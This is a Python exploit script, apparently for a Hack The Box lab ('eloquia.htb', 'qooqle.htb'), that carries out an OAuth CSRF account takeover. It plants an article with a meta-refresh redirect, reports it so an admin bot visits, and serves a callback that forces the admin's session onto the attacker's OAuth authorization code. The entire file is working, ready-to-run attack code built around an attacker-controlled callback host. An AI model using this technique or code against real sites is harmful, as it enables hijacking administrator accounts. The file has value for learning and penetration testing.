#!/usr/bin/env python3
"""
Eloquia OAuth CSRF Account Takeover Exploit (User Image)
=======================================================
Requirements: A valid JPEG image > 20KB provided by the user.
"""

import argparse
import sys
import re
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import threading
import time
import requests
from bs4 import BeautifulSoup

# =============================================================================
# CONFIGURATION
# =============================================================================

CONFIG = {
    "eloquia_url": "http://eloquia.htb",
    "qooqle_url": "http://qooqle.htb",
    "oauth_client_id": "riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi",
    "oauth_redirect_uri": "http://eloquia.htb/accounts/oauth2/qooqle/callback/",
    "timeout": 15,
}

CREDS = {
    "username": "attacker",
    "password": "AttackerPass123!",
}

# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

def log_success(msg):
    print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")

def log_error(msg):
    print(f"{Colors.RED}[-]{Colors.RESET} {msg}")

def log_info(msg):
    print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")

def get_csrf_token(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    csrf_input = soup.find("input", {"name": "csrfmiddlewaretoken"})
    if csrf_input and csrf_input.get("value"):
        return csrf_input["value"]
    match = re.search(r'name="csrfmiddlewaretoken"\s+value="([^"]+)"', html)
    if match:
        return match.group(1)
    raise ValueError("CSRF token not found")

def create_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    })
    return session

# =============================================================================
# CORE FUNCTIONS
# =============================================================================

def eloquia_login(session: requests.Session) -> bool:
    login_url = f"{CONFIG['eloquia_url']}/accounts/login/"
    try:
        resp = session.get(login_url, timeout=CONFIG["timeout"])
        csrf = get_csrf_token(resp.text)
        data = {
            "csrfmiddlewaretoken": csrf,
            "username": CREDS["username"],
            "password": CREDS["password"],
        }
        headers = {"Referer": login_url}
        resp = session.post(login_url, data=data, headers=headers, 
                           timeout=CONFIG["timeout"], allow_redirects=False)
        return resp.status_code in (302, 200) and ('sessionid' in session.cookies or 'Please enter a correct' not in resp.text)
    except Exception as e:
        log_error(f"Eloquia login failed: {e}")
        return False

def create_malicious_article(session: requests.Session, callback_url: str, image_path: str) -> str:
    create_url = f"{CONFIG['eloquia_url']}/article/create/"
    
    # 1. Get creation page
    resp = session.get(create_url, timeout=CONFIG["timeout"])
    csrf = get_csrf_token(resp.text)
    
    title = f"Security Update {int(time.time())}"
    content = f'<p>Loading...<meta http-equiv="refresh" content="0;url={callback_url}"></p>'
    
    # 2. Prepare Data
    data = {
        "csrfmiddlewaretoken": csrf,
        "title": title,
        "content": content,
        # category is handled by the server default often, but valid image is key
    }
    
    # 3. Read User Image
    files = None
    try:
        with open(image_path, "rb") as f:
            file_content = f.read()
            files = {"banner": ("image.jpg", file_content, "image/jpeg")}
    except FileNotFoundError:
        log_error(f"Image not found at: {image_path}")
        raise

    log_info(f"Uploading image: {image_path} ({len(file_content)} bytes)")

    # 4. Submit
    resp = session.post(create_url, data=data, files=files,timeout=CONFIG["timeout"], allow_redirects=False)
    
    # 5. Check Success
    location = resp.headers.get("Location", "")
    
    match = re.search(r"/article/(?:visit/)?(\d+)/", location)
    if match: return match.group(1)
    
    match = re.search(r"/article/(?:visit/)?(\d+)/", resp.text)
    if match: return match.group(1)
    
    # 6. DEBUGGING IF FAILED
    with open("debug_error.html", "w", encoding="utf-8") as f:
        f.write(resp.text)
    
    raise RuntimeError("Failed to create article. Check debug_error.html")

def report_article(session: requests.Session, article_id: str) -> bool:
    report_url = f"{CONFIG['eloquia_url']}/article/report/{article_id}/"
    resp = session.get(report_url, timeout=CONFIG["timeout"], allow_redirects=False)
    return resp.status_code in (200, 302)

def qooqle_login(session: requests.Session) -> bool:
    login_url = f"{CONFIG['qooqle_url']}/login/"
    try:
        resp = session.get(login_url, timeout=CONFIG["timeout"])
        csrf = get_csrf_token(resp.text)
        data = {
            "csrfmiddlewaretoken": csrf,
            "username": CREDS["username"],
            "password": CREDS["password"],
        }
        headers = {"Referer": login_url}
        resp = session.post(login_url, data=data, headers=headers,
                           timeout=CONFIG["timeout"], allow_redirects=False)
        return resp.status_code in (200, 302)
    except Exception as e:
        log_error(f"Qooqle login failed: {e}")
        return False

def get_oauth_code_url(session: requests.Session) -> str:
    authorize_url = (
        f"{CONFIG['qooqle_url']}/oauth2/authorize/"
        f"?client_id={CONFIG['oauth_client_id']}"
        f"&response_type=code"
        f"&redirect_uri={CONFIG['oauth_redirect_uri']}"
    )
    
    resp = session.get(authorize_url, timeout=CONFIG["timeout"], allow_redirects=False)
    csrf = get_csrf_token(resp.text)
    
    post_data = {
        "csrfmiddlewaretoken": csrf,
        "redirect_uri": CONFIG["oauth_redirect_uri"],
        "scope": "read write",
        "client_id": CONFIG["oauth_client_id"],
        "state": "",
        "response_type": "code",
        "allow": "Authorize",
    }
    
    headers = {"Referer": authorize_url, "Origin": CONFIG["qooqle_url"]}
    resp = session.post(authorize_url, data=post_data, headers=headers,
                       timeout=CONFIG["timeout"], allow_redirects=False)
    
    location = resp.headers.get("Location")
    if not location or "code" not in location:
         raise RuntimeError(f"Failed to get OAuth code. Loc: {location}")
    return location

# =============================================================================
# SERVER HANDLER
# =============================================================================

class CallbackHandler(BaseHTTPRequestHandler):
    article_id = None
    exploit_triggered = False
    
    def log_message(self, format, *args):
        pass 
    
    def do_GET(self):
        if self.path == "/test.html":
            log_success("Admin bot hit our callback!")
            if not CallbackHandler.article_id:
                self.send_response(503); self.end_headers(); return
            
            try:
                # 1. Login to Qooqle as Attacker
                session = create_session()
                if not qooqle_login(session): raise Exception("Qooqle Login Failed")
                
                # 2. Get Code
                redirect_url = get_oauth_code_url(session)
                log_info(f"Generated malicious Redirect URL")
                
                # 3. Redirect Admin to bind session
                self.send_response(302)
                self.send_header("Location", redirect_url)
                self.end_headers()
                
                CallbackHandler.exploit_triggered = True
                
            except Exception as e:
                log_error(f"Exploit Step Failed: {e}")
                self.send_response(500); self.end_headers()
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Server OK")

def run_server(host, port):
    server = HTTPServer((host, port), CallbackHandler)
    log_info(f"Callback server listening on {host}:{port}")
    server.serve_forever()

# =============================================================================
# MAIN
# =============================================================================

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--attacker-ip", required=True)
    parser.add_argument("--port", type=int, default=8080)
    # حقل جديد لطلب مسار الصورة
    parser.add_argument("--image", required=True, help="Path to a valid JPEG image (>20KB)")
    args = parser.parse_args()
    
    # التحقق من الصورة قبل البدء
    if not os.path.exists(args.image):
        log_error(f"Image file not found: {args.image}")
        sys.exit(1)
        
    # التحقق من حجم الصورة (أكبر من 20 كيلوبايت)
    if os.path.getsize(args.image) < 20480:
        log_error("Image is too small! It must be larger than 20KB.")
        sys.exit(1)

    callback_url = f"http://{args.attacker_ip}:{args.port}/test.html"
    
    # 1. Start Server
    t = threading.Thread(target=run_server, args=("0.0.0.0", args.port))
    t.daemon = True; t.start()
    time.sleep(1)
    
    # 2. Login
    log_info("Phase 1: Login to Eloquia...")
    session = create_session()
    if not eloquia_login(session):
        log_error("Login Failed! Check credentials."); sys.exit(1)
        
    # 3. Create Article
    log_info("Phase 2: Creating Article using provided image...")
    try:
        aid = create_malicious_article(session, callback_url, args.image)
        CallbackHandler.article_id = aid
        log_success(f"Article Created: ID {aid}")
    except Exception as e:
        log_error(str(e))
        sys.exit(1)
        
    # 4. Report
    log_info("Phase 3: Reporting...")
    if report_article(session, aid):
        log_success("Reported! Waiting for Admin...")
    
    # 5. Wait
    try:
        while not CallbackHandler.exploit_triggered:
            time.sleep(1)
        log_success("SUCCESS! Go log in via Qooqle now!")
    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == "__main__":
    main()